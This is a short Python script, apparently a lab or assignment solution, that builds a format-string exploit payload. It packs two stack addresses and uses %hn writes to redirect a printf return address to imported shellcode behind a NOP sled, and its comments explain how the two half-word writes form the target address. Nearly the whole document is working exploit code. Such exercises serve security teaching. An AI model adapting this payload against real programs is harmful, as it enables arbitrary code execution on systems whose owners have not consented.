from struct import pack
from shellcode import shellcode

#shellcode = "\x69" * 23
padding = "\x90" * 1
takeoff = pack("<I", 0xbffeb09c) # Address of esp
offset  = pack("<I", 0xbffeb09e)  # Address of esp

#print shellcode + padding + takeoff + offset + "%45200x%04$hn%03910x%05$hn"
print takeoff + offset + "%45260x%04$hn%03882x%05$hn" + "\x90\x90" + shellcode
# in this case, beginning of shellcode is at 0xbffeb0d4

# the idea is to write the first int as hex to the top half of the word and second int to the bottom
# such that the final built address points to the location of shellcode. this word is located at $esp
# just before printf rets.
